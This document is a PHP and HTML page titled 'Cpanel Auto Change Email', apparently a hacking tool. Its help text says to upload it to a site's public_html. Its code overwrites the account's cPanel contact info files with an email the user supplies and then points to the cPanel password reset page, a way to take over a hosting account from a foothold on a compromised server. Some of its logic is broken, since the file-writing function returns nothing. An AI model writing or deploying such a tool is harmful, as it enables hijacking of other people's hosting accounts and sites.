<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    	<meta name="theme-color" content="#000">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
    	<script src="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/2.1.2/sweetalert.min.js"></script>

    <title>Cpanel Auto Change Email!</title>
  </head>
  <body class="bg-dark">
  	
  	
    <div class="card border-info mt-4 bg-transparent">
    		<div class="card-header text-center text-light">
    			<h4>
    				Auto Change Email Cpanel
    			</h4>
    			<small>
    				<?= $_SERVER['HTTP_USER_AGENT']; ?>
    			</small>
    		</div>
    		
    		<div class="card-body">
    			<form method="post">
    				<div class="form-group">
    					<input type="email" name="email" class="form-control text-light bg-transparent" placeholder="Email..." required="required">
    				</div>
    				<button type="submit" name="change" class="btn btn-primary btn-block">Change!</button>
    			</form>
    		</div>
    		
    		<div class="card-footer text-light">
    			<a href="#" data-toggle="modal" data-target="#helps">Help >></a>
    		</div>
    </div>

    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    
    <!-- Modal bootstrap -->
    <div class="modal fade" id="helps" tabindex="-1" role="dialog" aria-labelledby="helpsLabel" aria-hidden="true">
    		<div class="modal-dialog" role="document">
    			<div class="modal-content">
    				<div class="modal-header">
    					<h5 class="modal-title" id="helpsLabel">How to use</h5>
    					<button type="button" class="close" data-dismiss="modal" aria-label="Close">
    						<span aria-hidden="true">&times;</span>
    					</button>
    				</div>
    				
    				<div class="modal-body">
    					<p>Step by step</p>
    					<ul>
    						<li>Upload on public_html</li>
    						<li>Change/setting your email</li>
    						<li>Check your mailbox</li>
    						<li>Well Done</li>
    					</ul>
    				</div>
    				
    				<div class="modal-footer">
    					<p>Follow fanspage : <a href="https://m.facebook.com/profile.php?id=110051390484387" target="_blank">Facebook</a></p>
    				</div>
    			</div>
    		</div>
    </div>
    
  </body>
</html>
<?php
error_reporting(0);
if(isset($_POST['change'])){
	$email = 'email:'.$_POST['email'];
	// $home = '/mnt/sdcard/htdocs/index.php';
	// 2083/resetpass?start=1
	
	$site  = $_SERVER['HTTP_HOST'].':2083/resetpass?start=1';
	$user  = get_current_user();
	$home  = '/home/'.$user.'/.cpanel/contactinfo';
	$home1 = '/home/'.$user.'/.contactinfo';
	
	/* Create */
	function create($curr, $email){
		$file = fopen($curr,'w');
		fwrite($file,$email);
		fclose($file);
	}
	
	function error($error){
		echo '<script>swal("Error Change","'.$error.' not found!!","error")</script>';
	}
	
	if(create($home,$email)){
		if(create($home1,$email)){
			header($site);
		}else{
			error($home1);
		}
	}else{
		error($home);
	}
}